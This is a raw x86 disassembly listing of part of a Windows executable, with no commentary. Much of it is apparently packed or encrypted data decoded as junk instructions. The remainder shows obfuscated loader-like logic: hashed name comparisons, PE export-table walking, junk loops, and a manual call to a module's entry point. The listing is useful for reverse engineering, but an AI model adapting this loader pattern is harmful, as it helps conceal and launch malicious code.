  410071:	sub    DWORD PTR [edx],ecx
  410073:	inc    ebp
  410074:	mov    dh,0x24
  410076:	mov    al,0x59
  410078:	fcmovu st,st(3)
  41007a:	inc    edi
  41007b:	mov    edx,DWORD PTR ss:0xe4185934
  410082:	xchg   esi,eax
  410083:	arpl   WORD PTR [eax],cx
  410085:	mov    ebp,0x7876f5a6
  41008a:	(bad)  
  41008b:	pushw  es
  41008d:	loopne 0x41004d
  41008f:	dec    ebp
  410090:	cmp    al,bh
  410092:	xor    eax,ebx
  410094:	test   al,0x1a
  410096:	mov    esi,0x4b565aef
  41009b:	jb     0x410023
  41009d:	retf   0x7454
  4100a0:	xchg   edi,eax
  4100a1:	jo     0x4100c2
  4100a3:	jmp    0x41007b
  4100a5:	add    ebx,DWORD PTR [ebp-0x7784d225]
  4100ab:	inc    ebp
  4100ac:	adc    dh,al
  4100ae:	cli    
  4100af:	pop    ds
  4100b0:	xlat   BYTE PTR ds:[ebx]
  4100b1:	push   0xa9bc7dc
  4100b6:	dec    eax
  4100b7:	dec    edx
  4100b8:	mov    cl,0x2
  4100ba:	(bad)  
  4100bb:	aam    0xb8
  4100bd:	outs   dx,BYTE PTR ds:[esi]
  4100be:	mov    ds:0x1b39d94d,eax
  4100c3:	ss mov ebx,0x37e929c9
  4100c9:	jbe    0x410109
  4100cb:	int    0xc0
  4100cd:	adc    cl,bl
  4100cf:	mov    eax,0x11f3397f
  4100d4:	mul    BYTE PTR [esi]
  4100d6:	sub    DWORD PTR [ecx-0x36],esi
  4100d9:	sub    eax,0x62167f5c
  4100de:	scas   eax,DWORD PTR es:[edi]
  4100df:	call   0x6245cce9
  4100e4:	enter  0xcaa8,0x2c
  4100e8:	and    DWORD PTR [ebx+0x2a],eax
  4100eb:	loopne 0x4100f4
  4100ed:	inc    edx
  4100ee:	jmp    0x410150
  4100f0:	icebp  
  4100f1:	in     al,dx
  4100f2:	shl    BYTE PTR [ebx+0x10],0x20
  4100f6:	daa    
  4100f7:	and    BYTE PTR [ebx-0x6d125fcd],0x95
  4100fe:	push   ebx
  4100ff:	cmp    al,BYTE PTR [eax+ecx*1-0x7b96da2]
  410106:	mov    edi,0x19b2bffb
  41010b:	push   ebx
  41010c:	test   BYTE PTR gs:[edi],bh
  41010f:	clc    
  410110:	rol    bh,0x41
  410113:	fldcw  WORD PTR [esi]
  410115:	mov    esp,0xb4cde6a8
  41011a:	(bad)  [esp+edi*4]
  41011d:	push   edx
  41011e:	sub    al,0x39
  410120:	add    al,0x67
  410122:	inc    ebx
  410123:	clc    
  410124:	jl     0x4100c4
  410126:	jo     0x410144
  410128:	test   BYTE PTR [ecx+0x3a],0xab
  41012c:	ins    DWORD PTR es:[edi],dx
  41012d:	repnz cmp bh,bl
  410130:	mov    esp,0xb00cf6c0
  410135:	add    al,0xa3
  410137:	mov    cl,0x63
  410139:	sbb    cl,dh
  41013b:	test   ebp,esp
  41013d:	rol    BYTE PTR [ebx-0x64],0xe2
  410141:	pop    eax
  410142:	js     0x410108
  410144:	xchg   ebx,eax
  410145:	mov    bl,0xe2
  410147:	push   esp
  410148:	sbb    al,0xc9
  41014a:	cld    
  41014b:	imul   ebx,esp,0x52fa659b
  410151:	dec    ebp
  410152:	iret   
  410153:	call   0x873745e7
  410158:	enter  0x9f44,0xcc
  41015c:	dec    edx
  41015d:	mov    WORD PTR [esi-0x47c81370],?
  410163:	fstp   TBYTE PTR [edx]
  410165:	xchg   BYTE PTR [ebx-0x3ececce9],dl
  41016b:	jl     0x410112
  41016d:	xchg   ecx,eax
  41016e:	push   ebx
  41016f:	es dec ebp
  410171:	popf   
  410172:	sbb    esi,DWORD PTR [edi+ecx*1+0xce33f5d]
  410179:	jbe    0x4100fb
  41017b:	out    dx,eax
  41017c:	mov    eax,ds:0xaefa2f9b
  410181:	mov    BYTE PTR [edi+eax*1],ah
  410184:	jbe    0x410192
  410186:	sub    eax,0xa06e6e81
  41018b:	inc    ecx
  41018c:	into   
  41018d:	xor    DWORD PTR [edi+0x71],esi
  410190:	int    0xad
  410192:	loop   0x41019b
  410194:	nop
  410195:	pop    ss
  410196:	sbb    ch,BYTE PTR [ebp+ebp*1-0xe]
  41019a:	test   eax,0xe8a809ab
  41019f:	mov    ecx,0x6f2d03c1
  4101a4:	(bad)
  4101a8:	test   BYTE PTR [ecx+0x3d8e369e],0xeb
  4101af:	cmc    
  4101b0:	sbb    cl,BYTE PTR [ecx]
  4101b2:	imul   eax,ebx,0xaebd7a9d
  4101b8:	adc    al,0x11
  4101ba:	popa   
  4101bb:	cmp    edx,esp
  4101bd:	pop    edi
  4101be:	stos   DWORD PTR es:[edi],eax
  4101bf:	lds    edx,FWORD PTR [ebp-0x5e]
  4101c2:	test   BYTE PTR ds:0xd2578283,dl
  4101c8:	enter  0xd3e9,0xb2
  4101cc:	lods   eax,DWORD PTR ds:[esi]
  4101cd:	fiadd  DWORD PTR [ebx]
  4101cf:	mov    al,0x6b
  4101d1:	aaa    
  4101d2:	cmc    
  4101d3:	ror    DWORD PTR [eax],0x5a
  4101d6:	or     edx,0x52
  4101d9:	dec    edx
  4101da:	push   cs
  4101db:	xlat   BYTE PTR ds:[ebx]
  4101dc:	push   eax
  4101dd:	or     eax,0xd330ceed
  4101e2:	dec    ebp
  4101e3:	pop    ecx
  4101e4:	(bad)  
  4101e5:	xchg   esi,eax
  4101e6:	mov    DWORD PTR [eax-0x309b4fb1],edx
  4101ec:	add    eax,0xc058babd
  4101f1:	or     al,0xde
  4101f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101f4:	int3   
  4101f5:	retf   0x4c00
  4101f8:	lock mov ah,0x17
  4101fb:	rcr    BYTE PTR [ebx+0x70a20982],0x84
  410202:	iret   
  410203:	ret    0xcffc
  410206:	inc    eax
  410207:	mov    bh,0x94
  410209:	cmc    
  41020a:	out    dx,eax
  41020b:	test   eax,0x55da88dc
  410210:	or     ch,BYTE PTR [esi+0x4]
  410213:	or     DWORD PTR [edi+0x62],edx
  410216:	inc    ebp
  410217:	cmp    ch,BYTE PTR [esi]
  410219:	out    dx,eax
  41021a:	test   al,0x4b
  41021c:	xbegin 0x4db16f26
  410222:	xchg   ebx,eax
  410223:	mov    al,ds:0xc60ecf1b
  410228:	int3   
  410229:	in     eax,0x4d
  41022b:	cmc    
  41022c:	lods   al,BYTE PTR ds:[esi]
  41022d:	or     BYTE PTR [edx],al
  41022f:	pop    es
  410230:	(bad)  
  410231:	cdq    
  410232:	mov    ebx,0xc696e9b
  410237:	arpl   WORD PTR [ebx+0x5621969b],ax
  41023d:	jecxz  0x41024f
  41023f:	sub    DWORD PTR [ecx+eiz*4],esi
  410242:	imul   ebp,DWORD PTR [esi],0x9eeaf3fc
  410248:	jg     0x4101d0
  41024a:	mov    ebx,0x992eca4a
  41024f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410250:	adc    DWORD PTR ds:0x72522ead,ebx
  410256:	add    al,0x68
  410258:	retf   0x7bd2
  41025b:	dec    esp
  41025c:	out    0xff,eax
  41025e:	jnp    0x4102cd
  410260:	sbb    esp,DWORD PTR [ebp-0x33]
  410263:	imul   eax,DWORD PTR [edi+0x59],0x46dfa765
  41026a:	ins    BYTE PTR es:[edi],dx
  41026b:	daa    
  41026c:	lods   al,BYTE PTR ds:[esi]
  41026d:	xchg   esp,eax
  41026e:	cmp    eax,0x699aead6
  410273:	lds    edx,FWORD PTR [edx-0x2e968e99]
  410279:	test   BYTE PTR [esi+eax*8-0x27],0x2a
  41027e:	push   esi
  41027f:	imul   esp,DWORD PTR [ebx],0xffffff84
  410282:	sub    esp,DWORD PTR [edi+edi*8]
  410285:	xchg   edx,eax
  410286:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410287:	rcr    DWORD PTR [esi+0x7762229f],1
  41028d:	and    DWORD PTR [edx],ecx
  41028f:	and    al,0x69
  410291:	sub    eax,0xf6ff96e1
  410296:	unpcklps xmm4,XMMWORD PTR [edi]
  410299:	pop    edx
  41029a:	arpl   si,si
  41029c:	call   0x5b7a:0x45a5b605
  4102a3:	push   edx
  4102a4:	loope  0x410280
  4102a6:	mov    ebx,esp
  4102a8:	fcom   QWORD PTR [eax+edx*1]
  4102ab:	dec    edi
  4102ac:	xchg   ebp,eax
  4102ad:	jmp    0x51fd2548
  4102b2:	nop
  4102b3:	jno    0x4102d2
  4102b5:	nop
  4102b6:	jg     0x4102b3
  4102b8:	ins    BYTE PTR es:[edi],dx
  4102b9:	loop   0x4102c0
  4102bb:	jmp    0xa087:0xacf523b7
  4102c2:	sbb    al,0x2d
  4102c4:	les    edi,FWORD PTR [edx-0x3936600f]
  4102ca:	push   esp
  4102cb:	add    eax,0xd7eae055
  4102d0:	std    
  4102d1:	ja     0x410342
  4102d3:	and    ch,BYTE PTR [eax+0x20]
  4102d6:	and    DWORD PTR [eax-0x3e],edx
  4102d9:	lahf   
  4102da:	jge    0x4102fb
  4102dc:	dec    ebp
  4102dd:	scas   eax,DWORD PTR es:[edi]
  4102de:	retf   
  4102df:	(bad)
  4102e3:	inc    edi
  4102e4:	pop    edx
  4102e5:	mov    bh,0x1
  4102e7:	scas   al,BYTE PTR es:[edi]
  4102e8:	xchg   eax,edi
  4102ea:	popf   
  4102eb:	hlt    
  4102ec:	nop
  4102ed:	loopne 0x410364
  4102ef:	ss push edi
  4102f1:	mov    cl,0x8b
  4102f3:	pop    ecx
  4102f4:	in     eax,dx
  4102f5:	sub    BYTE PTR [ecx-0x11],al
  4102f8:	inc    ebx
  4102f9:	fild   DWORD PTR [edx+0x2c1d0ab4]
  4102ff:	push   esi
  410300:	stos   DWORD PTR es:[edi],eax
  410301:	faddp  st(2),st
  410303:	xchg   DWORD PTR [eax-0x44],eax
  410306:	and    ebx,eax
  410308:	or     al,0xe1
  41030a:	das    
  41030b:	dec    esi
  41030c:	push   0x64328db9
  410311:	nop
  410312:	inc    ebp
  410313:	pop    eax
  410314:	pop    esp
  410315:	xlat   BYTE PTR ds:[ebx]
  410316:	mov    al,0x93
  410318:	iret   
  410319:	cmp    dl,BYTE PTR [edi+0xb]
  41031c:	sub    eax,0x84e46978
  410321:	imul   ebx,DWORD PTR [ebp+esi*8-0x66283f6],0x12
  410329:	xor    ebx,DWORD PTR [esi+0x5983d171]
  41032f:	shl    DWORD PTR [ebp-0x33],0xf1
  410333:	in     eax,dx
  410334:	dec    edx
  410335:	pushf  
  410336:	jl     0x4102ce
  410338:	fdivr  QWORD PTR [eax+ecx*8-0x46e4e8fb]
  41033f:	loopne 0x41035a
  410341:	xchg   ebp,eax
  410342:	in     eax,0x8d
  410344:	push   ss
  410345:	push   ebx
  410346:	add    DWORD PTR [edx-0x24a145b5],edx
  41034c:	adc    DWORD PTR [eax+0x53],esp
  41034f:	pop    esi
  410350:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410351:	fwait
  410352:	xlat   BYTE PTR ds:[ebx]
  410353:	jmp    0xa229:0x3facc8a3
  41035a:	inc    eax
  41035b:	in     al,dx
  41035c:	not    DWORD PTR [edi+0x618e1c6c]
  410362:	call   0xa710:0xaad0fc38
  410369:	adc    DWORD PTR [esi+eax*2],0x1b
  41036d:	mov    ebx,0x3b4b
  410372:	sub    di,bx
  410375:	mov    ebx,0x8a85
  41037a:	xor    di,bx
  41037d:	mov    ebx,0x4f8a
  410382:	cmp    di,bx
  410385:	jne    0x4103ad
  41038b:	movsx  di,BYTE PTR [eax]
  41038f:	mov    ebx,0x3b4b
  410394:	sub    di,bx
  410397:	mov    ebx,0x8a85
  41039c:	xor    di,bx
  41039f:	mov    ebx,0x4f87
  4103a4:	cmp    di,bx
  4103a7:	je     0x4103bd
  4103ad:	mov    edi,DWORD PTR [ebp-0x10]
  4103b0:	xor    edi,ecx
  4103b2:	mov    ebx,esi
  4103b4:	sub    ebx,edi
  4103b6:	add    eax,ebx
  4103b8:	jmp    0x40dfbd
  4103bd:	mov    esi,DWORD PTR [ebp-0x14]
  4103c0:	mov    esi,DWORD PTR [esi]
  4103c2:	mov    edi,DWORD PTR [eax+0x3c]
  4103c5:	lea    esi,[edi+esi*8+0x78]
  4103c9:	mov    esi,DWORD PTR [esi+eax*1]
  4103cc:	mov    DWORD PTR [ebp-0x8],esi
  4103cf:	mov    esi,DWORD PTR [ebp+0x8]
  4103d2:	xor    esi,ecx
  4103d4:	add    esi,edx
  4103d6:	mov    DWORD PTR [ebp-0x14],esi
  4103d9:	mov    esi,DWORD PTR [ebp+0x8]
  4103dc:	mov    edi,DWORD PTR [ebp-0x8]
  4103df:	xor    esi,ecx
  4103e1:	add    esi,edx
  4103e3:	pop    ebx
  4103e4:	cmp    edi,esi
  4103e6:	jne    0x410404
  4103ec:	mov    eax,DWORD PTR [ebp+0xc]
  4103ef:	xor    eax,ecx
  4103f1:	mov    ecx,DWORD PTR [ebp-0x8]
  4103f4:	add    eax,edx
  4103f6:	imul   eax,ecx
  4103f9:	mov    DWORD PTR [ebp-0x8],eax
  4103fc:	push   DWORD PTR [ebp+0x18]
  4103ff:	jmp    0x410458
  410404:	mov    ecx,DWORD PTR [ebp-0x8]
  410407:	add    ecx,eax
  410409:	mov    DWORD PTR [ebp-0x14],ecx
  41040c:	mov    ecx,DWORD PTR [ebp-0x14]
  41040f:	mov    ecx,DWORD PTR [ecx+0xc]
  410412:	movsx  cx,BYTE PTR [ecx+eax*1]
  410417:	mov    edx,0x3b4b
  41041c:	sub    cx,dx
  41041f:	mov    edx,0x8a85
  410424:	xor    cx,dx
  410427:	mov    edx,0x4f85
  41042c:	cmp    cx,dx
  41042f:	jne    0x4103fc
  410435:	mov    ecx,DWORD PTR ds:0x41d46c
  41043b:	mov    ecx,DWORD PTR [ecx+0x198]
  410441:	mov    DWORD PTR [ecx],eax
  410443:	jmp    0x410469
  410448:	mov    ecx,DWORD PTR [ebp+0x18]
  41044b:	cmp    ecx,0xf89c85b5
  410451:	jne    0x410469
  410457:	push   eax
  410458:	push   DWORD PTR [ebp+0x14]
  41045b:	push   DWORD PTR [ebp+0x10]
  41045e:	push   DWORD PTR [ebp+0xc]
  410461:	push   DWORD PTR [ebp+0x8]
  410464:	call   0x40b7a6
  410469:	pop    edi
  41046a:	pop    esi
  41046b:	leave  
  41046c:	ret    0x14
  41046f:	push   ebp
  410470:	mov    ebp,esp
  410472:	sub    esp,0x48
  410475:	and    DWORD PTR ds:0x427018,0x0
  41047f:	mov    eax,ds:0x427018
  410484:	inc    eax
  410485:	mov    ds:0x427018,eax
  41048a:	cmp    DWORD PTR ds:0x427018,0xc
  410491:	jne    0x4104a6
  410497:	push   DWORD PTR [ebp-0xc]
  41049a:	push   DWORD PTR [ebp-0xc]
  41049d:	push   DWORD PTR [ebp-0x28]
  4104a0:	call   DWORD PTR ds:0x421028
  4104a6:	cmp    DWORD PTR ds:0x427018,0xb
  4104ad:	jne    0x4104be
  4104b3:	mov    eax,ds:0x427018
  4104b8:	inc    eax
  4104b9:	mov    ds:0x427018,eax
  4104be:	cmp    DWORD PTR ds:0x427018,0x1f
  4104c5:	jb     0x41047f
  4104cb:	adc    DWORD PTR ds:0x428010,ebx
  4104d1:	push   ebx
  4104d2:	mov    DWORD PTR ds:0x426010,0x1e
  4104dc:	cmp    DWORD PTR ds:0x426010,0x0
  4104e3:	je     0x410526
  4104e9:	cmp    DWORD PTR ds:0x426010,0x26
  4104f0:	jne    0x410501
  4104f6:	push   0x41ff42
  4104fb:	call   DWORD PTR ds:0x42102c
  410501:	xor    eax,eax
  410503:	xor    eax,DWORD PTR ds:0x426010
  410509:	dec    eax
  41050a:	mov    ds:0x426010,eax
  41050f:	jmp    0x4104dc
  410514:	movzx  eax,WORD PTR ds:0x427014
  41051b:	sub    eax,DWORD PTR ds:0x426004
  410521:	mov    ds:0x427014,eax
  410526:	push   esi
  410527:	push   edi
  410528:	and    DWORD PTR ds:0x428000,0x0
  410532:	jmp    0x410544
  410537:	mov    edi,DWORD PTR ds:0x428000
  41053d:	inc    edi
  41053e:	mov    DWORD PTR ds:0x428000,edi
  410544:	cmp    DWORD PTR ds:0x428000,0x1e
  41054b:	jae    0x410597
  410551:	cmp    DWORD PTR ds:0x428000,0x1f
  410558:	jne    0x41058c
  41055e:	push   DWORD PTR [ebp-0x28]
  410561:	push   0x3d00
  410566:	push   0x5480
  41056b:	push   DWORD PTR [ebp-0x10]
  41056e:	push   DWORD PTR [ebp-0x24]
  410571:	push   DWORD PTR [ebp-0x1c]
  410574:	push   0x6187
  410579:	push   DWORD PTR [ebp-0x20]
  41057c:	push   0x5fd8
  410581:	push   0x12ef
  410586:	call   DWORD PTR ds:0x421030
  41058c:	jmp    0x410537
  410591:	and    eax,DWORD PTR ds:0x426018
  410597:	xor    esi,esi
  410599:	and    DWORD PTR ds:0x428008,0x0
  4105a3:	jmp    0x4105b5
  4105a8:	mov    edi,DWORD PTR ds:0x428008
  4105ae:	inc    edi
  4105af:	mov    DWORD PTR ds:0x428008,edi
  4105b5:	cmp    DWORD PTR ds:0x428008,0x1e
  4105bc:	jae    0x4105ff
  4105c2:	cmp    DWORD PTR ds:0x428008,0xe
  4105c9:	jne    0x4105e0
  4105cf:	push   DWORD PTR [ebp-0x18]
  4105d2:	push   0x425020
  4105d7:	push   DWORD PTR [ebp-0x28]
  4105da:	call   DWORD PTR ds:0x421034
  4105e0:	cmp    DWORD PTR ds:0x428008,0xd
  4105e7:	jne    0x4105fa
  4105ed:	mov    edi,DWORD PTR ds:0x428008
  4105f3:	inc    edi
  4105f4:	mov    DWORD PTR ds:0x428008,edi
  4105fa:	jmp    0x4105a8
  4105ff:	mov    DWORD PTR [ebp-0x20],esi
  410602:	or     eax,edi
  410604:	mov    eax,DWORD PTR [ebp-0xc]
  410607:	push   0x21
  410609:	and    DWORD PTR ds:0x429004,edi
  41060f:	mov    DWORD PTR [ebp-0xc],eax
  410612:	add    edi,DWORD PTR ds:0x425020
  410618:	pop    edi
  410619:	add    DWORD PTR ds:0x425010,0x428010
  410623:	push   0x41d580
  410628:	call   DWORD PTR ds:0x421040
  41062e:	push   esi
  41062f:	and    DWORD PTR ds:0x425008,0x428018
  410639:	push   0x2
  41063b:	adc    DWORD PTR ds:0x425018,0x428008
  410645:	push   0x1
  410647:	xor    DWORD PTR ds:0x429004,0x425020
  410651:	push   0x2
  410653:	push   0x1
  410655:	add    DWORD PTR ds:0x42800c,0x158b
  41065f:	push   0x8678768
  410664:	push   0x87676776
  410669:	call   DWORD PTR ds:0x42100c
  41066f:	xor    DWORD PTR ds:0x427014,0x429004
  410679:	push   esi
  41067a:	add    DWORD PTR ds:0x42601c,0x4e21
  410684:	push   0x68
  410686:	and    DWORD PTR ds:0x425024,0x9b5
  410690:	push   0xd
  410692:	not    DWORD PTR ds:0x42501c
  410698:	push   0x5
  41069a:	or     DWORD PTR ds:0x425020,0x429010
  4106a4:	push   0x3
  4106a6:	push   0x5468787
  4106ab:	call   DWORD PTR ds:0x421024
  4106b1:	dec    edi
  4106b2:	mov    DWORD PTR ds:0x425010,0x709e
  4106bc:	jne    0x410619
  4106c2:	mov    eax,DWORD PTR [ebp-0xc]
  4106c5:	mov    DWORD PTR ds:0x425000,edi
  4106cb:	mov    ebx,0xf89c85b6
  4106d0:	cmp    eax,ebx
  4106d2:	mov    DWORD PTR ds:0x426014,0x6187
  4106dc:	jne    0x4107d8
  4106e2:	or     DWORD PTR ds:0x426008,0x425010
  4106ec:	mov    DWORD PTR ds:0x41d57c,0xf89c85b5
  4106f6:	add    DWORD PTR ds:0x428014,0x8c5
  410700:	push   DWORD PTR [ebp+0x10]
  410703:	sbb    DWORD PTR ds:0x426004,0x426010
  41070d:	push   DWORD PTR [ebp+0xc]
  410710:	push   DWORD PTR [ebp+0x8]
  410713:	call   0x403cbf
  410718:	mov    DWORD PTR ds:0x426018,0x1f
  410722:	cmp    DWORD PTR ds:0x426018,0x0
  410729:	je     0x4107c2
  41072f:	cmp    DWORD PTR ds:0x426018,0xf
  410736:	jne    0x41074a
  41073c:	push   DWORD PTR [ebp-0x14]
  41073f:	push   0x348e
  410744:	call   DWORD PTR ds:0x421038
  41074a:	cmp    DWORD PTR ds:0x426018,0x10
  410751:	jne    0x410764
  410757:	mov    edi,DWORD PTR ds:0x426018
  41075d:	dec    edi
  41075e:	mov    DWORD PTR ds:0x426018,edi
  410764:	mov    edi,DWORD PTR ds:0x426018
  41076a:	dec    edi
  41076b:	mov    DWORD PTR ds:0x426018,edi
  410771:	jmp    0x410722
  410776:	and    DWORD PTR ds:0x429004,0x0
  410780:	mov    esi,DWORD PTR ds:0x429004
  410786:	inc    esi
  410787:	mov    DWORD PTR ds:0x429004,esi
  41078d:	cmp    DWORD PTR ds:0x429004,0x1f
  410794:	jne    0x4107b5
  41079a:	push   0x55b4
  41079f:	push   DWORD PTR [ebp-0x14]
  4107a2:	push   0x42600c
  4107a7:	push   0x45b8
  4107ac:	push   DWORD PTR [ebp-0x28]
  4107af:	call   DWORD PTR ds:0x421000
  4107b5:	cmp    DWORD PTR ds:0x429004,0x16
  4107bc:	jb     0x410780
  4107c2:	mov    ecx,DWORD PTR ds:0x41d46c
  4107c8:	sub    esi,edi
  4107ca:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4107d0:	and    edi,0x3fae
  4107d6:	mov    DWORD PTR [ecx],eax
  4107d8:	or     edi,DWORD PTR ds:0x425010
  4107de:	mov    DWORD PTR [ebp-0x4],ebx
  4107e1:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4107e8:	lea    eax,[ebp-0x28]
  4107eb:	xor    DWORD PTR ds:0x425018,edx
  4107f1:	mov    DWORD PTR [ebp-0x20],eax
  4107f4:	sbb    edi,DWORD PTR ds:0x429010
  4107fa:	lea    eax,[ebp-0x2c]
  4107fd:	and    DWORD PTR ds:0x427014,0x0
  410807:	mov    edi,DWORD PTR ds:0x427014
  41080d:	inc    edi
  41080e:	mov    DWORD PTR ds:0x427014,edi
  410814:	cmp    DWORD PTR ds:0x427014,0x1d
  41081b:	jne    0x41082c
  410821:	push   0x45e3
  410826:	call   DWORD PTR ds:0x421004
  41082c:	cmp    DWORD PTR ds:0x427014,0x1c
  410833:	jb     0x410807
  410839:	sbb    DWORD PTR ds:0x42501c,edx
  41083f:	mov    DWORD PTR [ebp-0x1c],eax
  410842:	and    DWORD PTR ds:0x428010,0x0
  41084c:	mov    edi,DWORD PTR ds:0x428010
  410852:	inc    edi
  410853:	mov    DWORD PTR ds:0x428010,edi
  410859:	cmp    DWORD PTR ds:0x428010,0xd
  410860:	jne    0x410874
  410866:	push   0x41ff71
  41086b:	push   DWORD PTR [ebp-0xc]
  41086e:	call   DWORD PTR ds:0x421008
  410874:	cmp    DWORD PTR ds:0x428010,0xc
  41087b:	jne    0x41088e
  410881:	mov    edi,DWORD PTR ds:0x428010
  410887:	inc    edi
  410888:	mov    DWORD PTR ds:0x428010,edi
  41088e:	cmp    DWORD PTR ds:0x428010,0x1b
  410895:	jb     0x41084c
  41089b:	and    edi,esi
  41089d:	mov    eax,ds:0x41d46c
  4108a2:	sub    ecx,esi
  4108a4:	mov    eax,DWORD PTR [eax+0x1c8]
  4108aa:	mov    eax,DWORD PTR [eax]
  4108ac:	mov    ecx,DWORD PTR [ebp-0x1c]
  4108af:	not    edi
  4108b1:	mov    esi,0x7510893
  4108b6:	xor    eax,esi
  4108b8:	movzx  edi,BYTE PTR ds:0x425028
  4108bf:	add    DWORD PTR ds:0x427018,edi
  4108c5:	mov    edi,0x3272db
  4108ca:	adc    DWORD PTR ds:0x42601c,0x425018
  4108d4:	add    eax,edi
  4108d6:	mov    DWORD PTR ds:0x425000,0x302d
  4108e0:	mov    DWORD PTR [ecx],eax
  4108e2:	mov    DWORD PTR ds:0x429010,ebx
  4108e8:	mov    eax,ds:0x41d668
  4108ed:	mov    DWORD PTR ds:0x427008,0x286e
  4108f7:	cmp    eax,0x301ac8f5
  4108fc:	jne    0x41095e
  410902:	and    DWORD PTR ds:0x427000,0x0
  41090c:	xor    eax,eax
  41090e:	or     eax,DWORD PTR ds:0x427000
  410914:	inc    eax
  410915:	mov    ds:0x427000,eax
  41091a:	cmp    DWORD PTR ds:0x427000,0x19
  410921:	jne    0x410930
  410927:	push   DWORD PTR [ebp-0x28]
  41092a:	call   DWORD PTR ds:0x421048
  410930:	cmp    DWORD PTR ds:0x427000,0x17
  410937:	jb     0x41090c
  41093d:	mov    eax,DWORD PTR [ebp-0x4]
  410940:	mov    ecx,DWORD PTR ds:0x41d46c
  410946:	mov    ecx,DWORD PTR [ecx+0x198]
  41094c:	xor    eax,esi
  41094e:	add    eax,edi
  410950:	mov    DWORD PTR [ecx],eax
  410952:	mov    eax,DWORD PTR [ebp-0x4]
  410955:	xor    eax,esi
  410957:	add    eax,edi
  410959:	mov    ds:0x41d668,eax
  41095e:	mov    eax,ds:0x41d46c
  410963:	mov    eax,DWORD PTR [eax+0x18c]
  410969:	mov    eax,DWORD PTR [eax]
  41096b:	mov    DWORD PTR [ebp-0x30],eax
  41096e:	mov    eax,0xf89c85ba
  410973:	mov    DWORD PTR [ebp-0x1c],eax
  410976:	mov    DWORD PTR [ebp-0x1c],eax
  410979:	mov    DWORD PTR [ebp-0x1c],eax
  41097c:	mov    DWORD PTR [ebp-0x1c],ebx
  41097f:	mov    DWORD PTR [ebp-0x38],eax
  410982:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  410989:	mov    ebx,DWORD PTR [ebp-0x4]
  41098c:	mov    ecx,DWORD PTR [ebp-0x8]
  41098f:	mov    edx,DWORD PTR [ebp-0x8]
  410992:	xor    edx,esi
  410994:	xor    ecx,esi
  410996:	add    ecx,edx
  410998:	mov    edx,DWORD PTR [ebp-0x8]
  41099b:	xor    ebx,esi
  41099d:	xor    edx,esi
  41099f:	add    ebx,edi
  4109a1:	lea    ecx,[ecx+edx*1+0x975891]
  4109a8:	cmp    ebx,ecx
  4109aa:	ja     0x410a0b
  4109b0:	mov    eax,DWORD PTR [ebp-0x8]
  4109b3:	xor    eax,esi
  4109b5:	lea    eax,[eax+ebx*1+0x3272db]
  4109bc:	push   eax
  4109bd:	mov    eax,DWORD PTR [ebp-0x1c]
  4109c0:	xor    eax,esi
  4109c2:	lea    eax,[ebp+eax*1+0x3272e3]
  4109c9:	push   eax
  4109ca:	mov    eax,ds:0x41d46c
  4109cf:	push   DWORD PTR [eax+0x1bc]
  4109d5:	call   0x403ce8
  4109da:	mov    eax,DWORD PTR [ebp-0x8]
  4109dd:	xor    eax,esi
  4109df:	lea    ebx,[ebx+eax*1+0x3272db]
  4109e6:	mov    eax,DWORD PTR [ebp-0x8]
  4109e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4109ec:	xor    ecx,esi
  4109ee:	xor    eax,esi
  4109f0:	add    eax,ecx
  4109f2:	mov    ecx,DWORD PTR [ebp-0x8]
  4109f5:	xor    ecx,esi
  4109f7:	lea    eax,[eax+ecx*1+0x975891]
  4109fe:	cmp    ebx,eax
  410a00:	jbe    0x4109b0
  410a06:	mov    eax,0xf89c85ba
  410a0b:	mov    ecx,DWORD PTR [ebp+0xc]
  410a0e:	mov    DWORD PTR ds:0x41d2f0,ecx
  410a14:	mov    ecx,DWORD PTR [ebp+0x10]
  410a17:	mov    DWORD PTR ds:0x41d544,ecx
  410a1d:	mov    ecx,DWORD PTR ds:0x41d2f0
  410a23:	mov    edx,DWORD PTR [ebp-0x20]
  410a26:	sub    ecx,edi
  410a28:	xor    ecx,esi
  410a2a:	mov    DWORD PTR [edx],ecx
  410a2c:	mov    edx,DWORD PTR [ebp-0xc]
  410a2f:	mov    ecx,0xf89c85b6
  410a34:	cmp    edx,ecx
  410a36:	jne    0x410a61
  410a3c:	lea    eax,[ebp-0x14]
  410a3f:	mov    DWORD PTR [ebp-0x24],eax
  410a42:	lea    eax,[ebp+0x4]
  410a45:	mov    DWORD PTR [ebp-0x14],eax
  410a48:	mov    eax,DWORD PTR [ebp-0x14]
  410a4b:	test   eax,eax
  410a4d:	je     0x410b76
  410a53:	mov    eax,DWORD PTR [ebp-0x10]
  410a56:	mov    eax,DWORD PTR [ebp-0x8]
  410a59:	lea    eax,[ebp-0x24]
  410a5c:	jmp    0x410b6d
  410a61:	mov    edx,DWORD PTR [ebp-0x28]
  410a64:	cmp    edx,0xf89c85b5
  410a6a:	je     0x410ac7
  410a70:	mov    edx,DWORD PTR [ebp-0x4]
  410a73:	mov    ebx,DWORD PTR [ebp-0x2c]
  410a76:	xor    edx,esi
  410a78:	add    edx,edi
  410a7a:	cmp    edx,ebx
  410a7c:	je     0x410ac7
  410a82:	mov    eax,ds:0x41d46c
  410a87:	mov    eax,DWORD PTR [eax+0x194]
  410a8d:	mov    ecx,DWORD PTR [eax]
  410a8f:	mov    eax,DWORD PTR [ecx+0x3c]
  410a92:	push   DWORD PTR ds:0x41d544
  410a98:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  410a9c:	push   DWORD PTR ds:0x41d2f0
  410aa2:	add    eax,ecx
  410aa4:	mov    ecx,DWORD PTR ds:0x41d46c
  410aaa:	mov    ecx,DWORD PTR [ecx+0x194]
  410ab0:	push   DWORD PTR [ecx]
  410ab2:	call   eax
  410ab4:	mov    ecx,DWORD PTR ds:0x41d46c
  410aba:	mov    ecx,DWORD PTR [ecx+0x1cc]
  410ac0:	mov    DWORD PTR [ecx],eax
  410ac2:	jmp    0x410b76
  410ac7:	mov    edx,DWORD PTR [ebp-0x4]
  410aca:	mov    ebx,DWORD PTR [ebp-0x30]
  410acd:	xor    edx,esi
  410acf:	add    edx,edi
  410ad1:	cmp    edx,ebx
  410ad3:	jne    0x410b2c
  410ad9:	mov    edx,DWORD PTR [ebp-0x4]
